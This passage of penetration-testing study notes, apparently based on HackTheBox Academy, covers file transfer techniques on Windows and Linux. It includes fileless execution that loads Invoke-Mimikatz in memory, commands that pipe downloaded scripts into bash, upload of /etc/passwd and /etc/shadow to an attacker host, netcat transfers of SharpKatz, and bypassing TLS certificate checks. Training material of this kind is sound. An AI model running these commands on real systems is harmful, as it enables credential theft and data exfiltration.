      DownloadFileAsync	  Downloads data from a resource to a local file without blocking the calling thread.
      DownloadString	    Downloads a String from a resource and returns a String.
      DownloadStringAsync	Downloads a String from a resource without blocking the calling thread.

  * PowerShell DownloadFile Method
    > We can specify the class name Net.WebClient and the method DownloadFile with the parameters corresponding to the URL of the target file to download and the output file name.
      PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
      PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
      PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
      PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com

  * Powershell DownloadString - Fileless method
    > As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression(https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias IEX.
      PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
    > IEX also accepts pipeline input.
      PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
  
  * PowerShell Invoke-WebRequest  
    > From PowerShell 3.0 onwards, the Invoke-WebRequest(https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2)cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases iwr, curl, and wget instead of the Invoke-WebRequest full name.
      PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
    > Harmj0y has compiled an extensive list of PowerShell download cradles here(https://gist.github.com/HarmJ0y/bb48307ffa663256e239). It is worth gaining familiarity with them and their nuances, such as a lack of proxy awareness or touching disk (downloading a file onto the target) to select the appropriate one for the situation.
    
[+] Common Errors with PowerShell
  > There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter -UseBasicParsing.
    PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX #Error
    PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
  > Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:
    PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1') #Error
    PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

[+] SMB Downloads
  > The Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.

  > We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with smbserver.py from Impacket and then use copy, move, PowerShell Copy-Item, or any other tool that allows connection to SMB.
    m1l0js@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare
  > To download a file from the SMB server to the current working directory, we can use the following command:
    C:\htb> copy \\192.168.220.133\share\nc.exe
  > New versions of Windows block unauthenticated guest access, as we can see in the following command:
    C:\htb> copy \\192.168.220.133\share\nc.exe
    You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
  > To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine:
    m1l0js@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
    #With net view \\10.10.16.47 ==> We can see the remote shares
    C:\htb> net use n: \\192.168.220.133\share /user:test test
    The command completed successfully.
    C:\htb> copy n:\nc.exe
        1 file(s) copied.
  > Note: You can also mount the SMB server if you receive an error when you use `copy filename \\IP\sharename`.

[+] FTP Downloads
  > Another way to transfer files is using FTP (File Transfer Protocol), which use port TCP/21 and TCP/20. We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.
  > We can configure an FTP Server in our attack host using Python3 pyftpdlib module.
    m1l0js@htb[/htb]$ sudo pip3 install pyftpdlib
  > Then we can specify port number 21 because, by default, pyftpdlib uses port 2121. Anonymous authentication is enabled by default if we don't set a user and password.
    m1l0js@htb[/htb]$ sudo python3 -m pyftpdlib --port 21
  > After the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShell Net.WebClient.
    PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')
  > When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.
    C:\htb> echo open 192.168.49.128 > ftpcommand.txt
    C:\htb> echo USER anonymous >> ftpcommand.txt

  * PowerShell Base64 Encode & Decode

  * PowerShell Web Uploads
    > PowerShell doesn't have a built-in function for upload operations, but we can use Invoke-WebRequest or Invoke-RestMethod to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.

    > For our web server, we can use uploadserver (https://github.com/Densaugeo/uploadserver), an extended module of the Python HTTP.server module(https://docs.python.org/3/library/http.server.html), which includes a file upload page. Let's install it and start the webserver. 
      pip3 install uploadserver
      python3 -m uploadserver
    > Now we can use a PowerShell script PSUpload.ps1(https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses Invoke-WebRequest to perform the upload operations. The script accepts two parameters -File, which we use to specify the file path, and -Uri, the server URL where we'll upload our file. Let's attempt to upload the host file from our Windows host.
      PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

    * PowerShell Base64 Web Upload
      > Another way to use PowerShell and base64 encoded files for upload operations is by using Invoke-WebRequest or Invoke-RestMethod together with Netcat. We use Netcat to listen in on a port we specify and send the file as a POST request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.
        PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
        PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64

  * SMB Uploads 
    > We previously discussed that companies usually allow outbound traffic using HTTP (TCP/80) and HTTPS (TCP/443) protocols. Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks. For more information on this, we can read the Microsoft post Preventing SMB traffic from lateral connections and entering or leaving the network => (https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a)

    > An alternative is to run SMB over HTTP with WebDav. WebDAV (RFC 4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The WebDAV protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. WebDAV can also use HTTPS.

    > When you use SMB, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP. In the following Wireshark capture, we attempt to connect to the file share testing3, and because it didn't find anything with SMB, it uses HTTP.
    
    [+] Configuring WebDav Server
      > To set up our WebDav server, we need to install two Python modules, wsgidav and cheroot (you can read more about this implementation here: wsgidav github (https://github.com/mar10/wsgidav)). After installing them, we run the wsgidav application in the target directory.
        m1l0js@htb[/htb]$ sudo pip install wsgidav cheroot
        m1l0js@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
      > Now we can attempt to connect to the share using the DavWWWRoot directory.
        C:\htb> dir \\192.168.49.128\DavWWWRoot
      > Note: DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server. You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder
      > uploading files using SMB
        C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
        C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
      > Note: If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.

  * FTP Uploads
    > Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module pyftpdlib, we need to specify the option --write to allow clients to upload files to our attack host.
      m1l0js@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write
    > Now let's use the PowerShell upload function to upload a file to our FTP Server.
      PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
    > Create a command file for the FTP client to upload a file
      C:\htb> echo open 192.168.49.128 > ftpcommand.txt
      C:\htb> echo USER anonymous >> ftpcommand.txt
      C:\htb> echo binary >> ftpcommand.txt
      C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
      C:\htb> echo bye >> ftpcommand.txt
      C:\htb> ftp -v -n -s:ftpcommand.txt

[+] Linux File Transfer Methods
+ Download Operations
  > We have access to the machine NIX04, and we need to download a file from our Pwnbox machine. Let's see how we can accomplish this using multiple file download methods.
  * Base64 Encoding / Decoding
    > Depending on the file size we want to transfer, we can use a method that does not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its content into the terminal and perform the reverse operation. Let's see how we can do this with Bash.
      m1l0js@htb[/htb]$ md5sum id_rsa
    > We use cat to print the file content, and base64 encode the output using a pipe |. We used the option -w 0 to create only one line and ended up with the command with a semi-colon (;) and echo keyword to start a new line and make it easier to copy.
      m1l0js@htb[/htb]$ cat id_rsa |base64 -w 0;echo
    > We copy this content, paste it onto our Linux target machine, and use base64 with the option `-d' to decode it.

      md5sum id_rsa
    > Note: You can also upload files using the reverse operation.

  * Web Downloads with Wget and cURL
    > Two of the most common utilities in Linux distributions to interact with web applications are wget and curl. These tools are installed on many Linux distributions.
    > To download a file using wget, we need to specify the URL and the option `-O' to set the output filename.
      m1l0js@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
      m1l0js@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

  * Fileless Attacks Using Linux
    > Because of the way Linux works and how pipes operate, most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.
    > Note: Some payloads such as mkfifo write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload choosen it may create temporary files on the OS.
    > Let's take the cURL command we used, and instead of downloading LinEnum.sh, let's execute it directly using a pipe.
      m1l0js@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
    > Similarly, we can download a Python script file from a web server and pipe it into the Python binary. Let's do that, this time using wget.
      m1l0js@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
  * Download with Bash (/dev/tcp)
    > There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.
      m1l0js@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80 #Connect to the target webserver
      m1l0js@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3 #HTTP GET Request
      m1l0js@htb[/htb]$ cat <&3 #Print the response
  * SSH Downloads
    > SSH (or Secure Shell) is a protocol that allows secure access to remote computers. SSH implementation comes with an SCP utility for remote file transfer that, by default, uses the SSH protocol.
    > SCP (secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine.
    > SCP is very similar to copy or cp, but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user's credentials.
    > Before we begin downloading files from our target Linux machine to our Pwnbox, let's set up an SSH server in our Pwnbox.
      m1l0js@htb[/htb]$ sudo systemctl enable ssh
      m1l0js@htb[/htb]$ sudo systemctl start ssh
      m1l0js@htb[/htb]$ netstat -lnpt
    > Now we can begin transferring files. We need to specify the IP address of our Pwnbox and the username and password.
      m1l0js@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
    > Note: You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer. 
[+] Upload Operations
  > There are also situations such as binary exploitation and packet capture analysis, where we must upload files from our target machine onto our attack host. The methods we used for downloads will also work for uploads. Let's see how we can upload files in various ways.
  * Web Upload
    > As mentioned in the Windows File Transfer Methods section, we can use uploadserver, an extended module of the Python HTTP.Server module, which includes a file upload page. For this Linux example, let's see how we can configure the uploadserver module to use HTTPS for secure communication.
    > The first thing we need to do is to install the uploadserver module.
      m1l0js@htb[/htb]$ python3 -m pip install --user uploadserver
    > Now we need to create a certificate. In this example, we are using a self-signed certificate.
      m1l0js@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
    > The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.
      m1l0js@htb[/htb]$ mkdir https && cd https
      m1l0js@htb[/htb]$ python3 -m uploadserver 443 --server-certificate /root/server.pem
    > Now from our compromised machine, let's upload the /etc/passwd and /etc/shadow files.
      m1l0js@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
    > We used the option --insecure because we used a self-signed certificate that we trust.

  * Alternative Web File Transfer Method
    > Since Linux distributions usually have Python or php installed, starting a web server to transfer files is straightforward. Also, if the server we compromised is a web server, we can move the files we want to transfer to the web server directory and access them from the web page, which means that we are downloading the file from our Pwnbox.
    > It is possible to stand up a web server using various languages. A compromised Linux machine may not have a web server installed. In such cases, we can use a mini web server. What they perhaps lack in security, they make up for flexibility, as the webroot location and listening ports can quickly be changed.

    > Note: When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.

  * SCP Upload
    > We may find some companies that allow the SSH protocol (TCP/22) for outbound connections, and if that's the case, we can use an SSH server with the scp utility to upload files. Let's attempt to upload a file using the SSH protocol.
    > File Upload using SCP
      m1l0js@htb[/htb]$ scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/

[+] Transfering files with code
  > It's common to find different programming languages installed on the machines we are targetting. Programming languages such as Python, PHP, Perl, and Ruby are commonly available in Linux distributions but can also be installed on Windows, although this is far less common.
  > We can use some Windows default applications, such as cscript and mshta, to execute JavaScript or VBScript code. JavaScript can also run on Linux hosts.
  > According to Wikipedia, there are around 700 programming languages, and we can create code in any programing language, to download, upload or execute instructions to the OS. This section will provide a few examples using common programming languages.
  * Python
    > Python is a popular programming language. Currently, version 3 is supported, but we may find servers where Python version 2.7 still exits. Python can run one-liners from an operating system command line using the option -c. Let's see some examples:
      m1l0js@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
      m1l0js@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
  * PHP
    > PHP is also very prevalent and provides multiple file transfer methods. According to W3Techs' data, PHP is used by 77.4% of all websites with a known server-side programming language. Although the information is not precise, and the number may be slightly lower, we will often encounter web services that use PHP when performing an offensive operation.
    > Let's see some examples of downloading files using PHP.
    > In the following example, we will use the PHP file_get_contents() module to download content from a website combined with the file_put_contents() module to save the file into a directory. PHP can be used to run one-liners from an operating system command line using the option -r.
      m1l0js@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
    > An alternative to file_get_contents() and file_put_contents() is the fpopen() module. We can use this module to open a URL, read it's content and save it into a file.
      m1l0js@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
    > We can also send the downloaded content to a pipe instead, similar to the fileless example we executed in the previous section using cURL and wget.
      m1l0js@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
    > Note: The URL can be used as a filename with the @file function if the fopen wrappers have been enabled. 
    
  * Other languages
    > Ruby and Perl are other popular languages that can also be used to transfer files. These two programming languages also support running one-liners from an operating system command line using the option -e.

    > JavaScript is a scripting or programming language that allows you to implement complex features on web pages. Like with other programming languages, we can use it for many different things. The following JavaScript code is based on this post(https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068), and we can download a file using it. We'll create a file called wget.js and save the following content:
      var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
      WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
      WinHttpReq.Send();
      BinStream = new ActiveXObject("ADODB.Stream");

  * Upload Operations using Python3
    > If we want to upload a file, we need to understand the functions in a particular programming language to perform the upload operation. The Python3 requests module allows you to send HTTP requests (GET, POST, PUT, etc.) using Python. We can use the following code if we want to upload a file to our Python3 uploadserver.
      m1l0js@htb[/htb]$ python3 -m uploadserver 
      m1l0js@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})' #Uploading a file using a python one-liner
    > Let's divide this one-liner into multiple lines to understand each piece better.
      # To use the requests function, we need to import the module first.
      import requests 
      # Define the target URL where we will upload the file.
      URL = "http://192.168.49.128:8000/upload"
      # Define the file we want to read, open it and save it in a variable.
      file = open("/etc/passwd","rb")
      # Use a requests POST request to upload the file. 
      r = requests.post(url,files={"files":file})

[+] Miscellaneous file transfer methods
* Netcat 
  > Netcat (often abbreviated to nc) is a computer networking utility for reading from and writing to network connections using TCP or UDP, which means that we can use it for file transfer operations.
  > The original Netcat was released by Hobbit in 1995, but it hasn't been maintained despite its popularity. The flexibility and usefulness of this tool prompted the Nmap Project to produce Ncat, a modern reimplementation that supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more.
  > In this section, we will use both the original Netcat and Ncat.
  > Note: Ncat is used in HackTheBox's PwnBox as nc, ncat, and netcat. 
  + File Transfer with Netcat and Ncat
    > The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target. Let's create an example and transfer a tool to our target.
    > In this example, we'll transfer SharpKatz.exe(https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) from our Pwnbox onto the compromised machine. We'll do it using two methods. Let's work through the first one.
    > We'll first start Netcat (nc) on the compromised machine, listening with option -l, selecting the port to listen with the option -p 8000, and redirect the stdout using a single greater-than > followed by the filename, SharpKatz.exe.
      + NetCat - Compromised Machine - Listening on Port 8000
        victim@target:~$ # Example using Original Netcat
        victim@target:~$ nc -l -p 8000 > SharpKatz.exe
    > If the compromised machine is using Ncat, we'll need to specify --recv-only to close the connection once the file transfer is finished.
      + Ncat - Compromised Machine - Listening on Port 8000
        victim@target:~$ # Example using Ncat
        victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
    > From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file SharpKatz.exe as input to Netcat. The option -q 0 will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.
      + Netcat - Attack Host - Sending File to Compromised machine
        m1l0js@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
        m1l0js@htb[/htb]$ # Example using Original Netcat
        m1l0js@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
    > If we use Ncat in our attack host, we can use --send-only instead of -q. --send-only in both connect and listen modes causes Ncat to quit when its input runs out. Usually, it will not stop until the network connection is closed because the remote side may still send something, but in the case of --send-only, there's no reason to receive anything more.
      + Ncat - Attack Host - Sending File to Compromised machine
        m1l0js@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
        m1l0js@htb[/htb]$ # Example using Ncat
        m1l0js@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
    > Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file SharpKatz.exe as input to Netcat.
      + Attack Host - Sending File as Input to Netcat
        m1l0js@htb[/htb]$ # Example using Original Netcat
        m1l0js@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
      + Compromised Machine Connect to Netcat to Receive the File
        victim@target:~$ # Example using Original Netcat
        victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe

    > Let's do the same with Ncat:
      + Attack Host - Sending File as Input to Ncat
        m1l0js@htb[/htb]$ # Example using Ncat
        m1l0js@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
      + Compromised Machine Connect to Ncat to Receive the File
        victim@target:~$ # Example using Ncat
        victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
    
    > If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file /dev/TCP/ (https://tldp.org/LDP/abs/html/devref1.html)
    > Writing to this particular file makes Bash open a TCP connection to host:port, and this feature may be used for file transfers.
      + NetCat - Sending File as Input to Netcat
        m1l0js@htb[/htb]$ # Example using Original Netcat
        m1l0js@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe

      + Ncat - Sending File as Input to Netcat
        m1l0js@htb[/htb]$ # Example using Ncat
        m1l0js@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
    
      + Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File
        victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
    > Note: The same operation can be used to transfer files from the compromised host to our Pwnbox. 

* PowerShell Session File Transfer
  > We already talk about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use PowerShell Remoting(https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), aka WinRM, to perform file transfer operations.
  > PowerShell Remoting(https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.
  > To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the Remote Management Users group, or have explicit permissions for PowerShell Remoting in the session configuration. Let's create an example and transfer a file from DC01 to DATABASE01 and vice versa.
  > We have a session as Administrator in DC01, the user has administrative rights on DATABASE01, and PowerShell Remoting is enabled. Let's use Test-NetConnection to confirm we can connect to WinRM.
  > From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.
    PS C:\htb> whoami
    htb\administrator
    PS C:\htb> hostname
    DC01
    PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
  > Because this session already has privileges over DATABASE01, we don't need to specify credentials. In the example below, a session is created to the remote computer named DATABASE01 and stores the results in the variable named $Session.
  > Create a PowerShell Remoting Session to DATABASE01
    PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
  > We can use the Copy-Item cmdlet to copy a file from our local machine DC01 to the DATABASE01 session we have $Session or vice versa.
  > Copy samplefile.txt from our Localhost to the DATABASE01 Session
    PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
  > Copy DATABASE.txt from DATABASE01 Session to our Localhost
    PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session

* RDP
  > RDP (Remote Desktop Protocol) is commonly used in Windows networks for remote access. We can transfer files using RDP by copying and pasting. We can right-click and copy a file from the Windows machine we connect to and paste it into the RDP session.
  > If we are connected from Linux, we can use xfreerdp or rdesktop. At the time of writing, xfreerdp and rdesktop allow copy from our target machine to the RDP session, but there may be scenarios where this may not work as expected.
  > As an alternative to copy and paste, we can mount a local resource on the target RDP server. rdesktop or xfreerdp can be used to expose a local folder in the remote RDP session
  + Mounting a Linux Folder Using rdesktop
    m1l0js@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
  + Mounting a Linux Folder Using xfreerdp
    m1l0js@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
  > To access the directory, we can connect to \\tsclient\, allowing us to transfer files to and from the RDP session.
  > Alternatively, from Windows, the native mstsc.exe remote desktop client can be used ==> Local Resources ==> More ==> Drives
  > After selecting the drive, we can interact with it in the remote session
  > Note: This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session. 

[+] Protected File Transfers
  > As penetration testers, we often gain access to highly sensitive data such as user lists, credentials (i.e., downloading the NTDS.dit file for offline password cracking), and enumeration data that can contain critical information about the organization's network infrastructure, and Active Directory (AD) environment, etc. Therefore, it is essential to encrypt this data or use encrypted data connections such as SSH, SFTP, and HTTPS. However, sometimes these options are not available to us, and a different approach is required.
  > Note: Unless specifically requested by a client, we do not recommend exfiltrating data such as Personally Identifiable Information (PII), financial data (i.e., credit card numbers), trade secrets, etc., from a client environment. Instead, if attempting to test Data Loss Prevention (DLP) controls/egress filtering protections, create a file with dummy data that mimics the data that the client is trying to protect. 
  > Therefore, encrypting the data or files before a transfer is often necessary to prevent the data from being read if intercepted in transit.
  > Data leakage during a penetration test could have severe consequences for the penetration tester, their company, and the client. As information security professionals, we must act professionally and responsibly and take all measures to protect any data we encounter during an assessment.
  * File Encryption on Windows
    > Many different methods can be used to encrypt files and information on Windows systems. One of the simplest methods is the Invoke-AESEncryption.ps1(https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1)PowerShell script. This script is small and provides encryption of files and strings.
    > We can use any previously shown file transfer methods to get this file onto a target host. After the script has been transferred, it only needs to be imported as a module, as shown below.
      PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1
    > After the script is imported, it can encrypt strings or files, as shown in the following examples. This command creates an encrypted file with the same name as the encrypted file but with the extension ".aes."
      + File Encryption Example
        PS C:\htb> Invoke-AESEncryption.ps1 -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
        File encrypted to C:\htb\scan-results.txt.aes
    > Using very strong and unique passwords for encryption for every company where a penetration test is performed is essential. This is to prevent sensitive files and information from being decrypted using one single password that may have been leaked and cracked by a third party.


  * File Encryption on Linux
    > OpenSSL is frequently included in Linux distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style" to encrypt files.
    > To encrypt a file using openssl we can select different ciphers, see OpenSSL man page. Let's use -aes256 as an example. We can also override the default iterations counts with the option -iter 100000 and add the option -pbkdf2 to use the Password-Based Key Derivation Function 2 algorithm. When we hit enter, we'll need to provide a password.
      + Encrypting /etc/passwd with openssl
        m1l0js@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
        enter aes-256-cbc encryption password:                                                         
        Verifying - enter aes-256-cbc encryption password:                       
    > Remember to use a strong and unique password to avoid brute-force cracking attacks should an unauthorized party obtain the file. To decrypt the file, we can use the following command:
      + Decrypt passwd.enc with openssl
        m1l0js@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    
        enter aes-256-cbc decryption password:


[+] Catching Files over HTTP/S
  > Web transfer is the most common way most people transfer files because HTTP/HTTPS are the most common protocols allowed through firewalls. Another immense benefit is that, in many cases, the file will be encrypted in transit. There is nothing worse than being on a Penetration Test, and a client's network IDS picks up on a sensitive file being transferred over plaintext and having them ask why we sent a password to our cloud server without using encryption.
  > We have already discussed using the Python3 uploadserver module to set up a web server with upload capabilities, but we can also use Apache or Nginx. This section will cover creating a secure web server for file upload operations.
  * Nginx - Enabling PUT
    > A good alternative for transferring files to Apache is Nginx(https://www.nginx.com/resources/wiki/) because the configuration is less complicated, and the module system does not lead to security issues as Apache can.
    > When allowing HTTP uploads, it is critical to be 100% positive that users cannot upload web shells and execute them. Apache makes it easy to shoot ourselves in the foot with this, as the PHP module loves to execute anything ending in PHP. Configuring Nginx to use PHP is nowhere near as simple.
      + Create a Directory to Handle Uploaded Files
        m1l0js@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory
      + Change the Owner to www-data
        m1l0js@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
      + Create Nginx Configuration File
        > Create the Nginx configuration file by creating the file /etc/nginx/sites-available/upload.conf with the contents:
          server {
              listen 9001;
              
              location /SecretUploadDirectory/ {
                  root    /var/www/uploads;
                  dav_methods PUT;
              }
          }
      + Symlink our Site to the sites-enabled Directory
